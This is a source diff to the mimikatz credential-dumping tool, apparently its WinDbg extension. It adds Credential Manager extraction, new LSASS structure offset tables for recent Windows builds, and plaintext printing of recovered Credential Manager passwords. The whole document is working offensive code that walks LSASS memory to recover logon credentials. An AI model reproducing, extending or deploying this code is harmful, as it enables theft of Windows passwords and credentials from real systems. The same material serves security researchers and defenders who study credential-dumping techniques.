@@ -69,12 +69,14 @@ KUHL_M_SEKURLSA_PACKAGE packages[] = {
 	{"ssp",			"msv1_0!SspCredentialList",				0, kuhl_m_sekurlsa_enum_logon_callback_ssp},
 	{"masterkey",	"lsasrv!g_MasterKeyCacheList",			0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
 	{"masterkey",	"dpapisrv!g_MasterKeyCacheList",		0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
+	{"credman",		NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_credman},
 };
 
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
-	{sizeof(KIWI_MSV1_0_LIST_6) , FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_6, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid)}
+	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager)},
 };
 
 DECLARE_API(mimikatz)
@@ -86,12 +88,14 @@ DECLARE_API(mimikatz)
 	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
 	PBYTE buffer;
 
-	if(NtBuildNumber < 8000)
+	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
 		helper = &lsassEnumHelpers[0];
-	else if(NtBuildNumber < 9400)
+	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
 		helper = &lsassEnumHelpers[1];
-	else
+	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
 		helper = &lsassEnumHelpers[2];
+	else
+		helper = &lsassEnumHelpers[3];
 
 	pInitializationVector = GetExpression("lsasrv!InitializationVector");
 	phAesKey = GetExpression("lsasrv!hAesKey");
@@ -134,6 +138,7 @@ DECLARE_API(mimikatz)
 												sessionData.LogonDomain	= (PUNICODE_STRING) (buffer + helper->offsetToDomain);
 												sessionData.pCredentials= *(PVOID *)		(buffer + helper->offsetToCredentials);
 												sessionData.pSid		= *(PSID *)			(buffer + helper->offsetToPSid);
+												sessionData.pCredentialManager = *(PVOID *) (buffer + helper->offsetToCredentialManager);
 
 												if((sessionData.LogonType != Network) /*&& (sessionData.LogonType != UndefinedLogonType)*/)
 												{
@@ -161,7 +166,7 @@ DECLARE_API(mimikatz)
 														if(packages[j].symbolPtr || !packages[j].symbolName)
 														{
 															dprintf("\t%s : ", packages[j].name);
-															packages[j].callback(packages[j].symbolPtr, sessionData.LogonId, sessionData.pCredentials);
+															packages[j].callback(packages[j].symbolPtr, &sessionData);
 															dprintf("\n");
 														}
 												}
@@ -277,9 +282,13 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						, username ? username : &uNull, domain ? domain : &uNull);
 
 					if(!password || kull_m_string_suspectUnicodeString(password))
-						dprintf("%wZ", password ? password : &uNull);
-					else 
-						kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);
+					{
+						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
+							dprintf("%.*S", password->Length / sizeof(wchar_t), password->Buffer);
+						else
+							dprintf("%wZ", password ? password : &uNull);
+					}
+					else kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);
 				}
 
 				LocalFree(mesCreds->UserName.Buffer);
